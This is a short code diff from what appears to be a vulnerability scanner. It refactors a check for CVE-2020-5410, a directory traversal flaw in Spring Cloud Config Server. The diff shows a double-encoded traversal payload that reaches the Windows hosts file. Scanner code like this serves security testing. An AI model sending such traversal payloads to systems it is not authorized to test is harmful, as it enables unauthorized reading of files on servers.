@@ -9,14 +9,14 @@ cve_2020_5410_payloads = [
     {'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:\Windows\System32\drivers\etc\hosts%23foo/development"'}
 ]
 
-def cve_2020_5410_scan(self, clients):
+def cve_2020_5410_scan(clients):
     ''' spring cloud config server目录遍历漏洞
             可以使用特制URL发送请求, 从而跨目录读取文件。
     '''
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Spring',
         'vul_type': 'FileRead',
         'vul_id': 'CVE-2020-5410',
     }
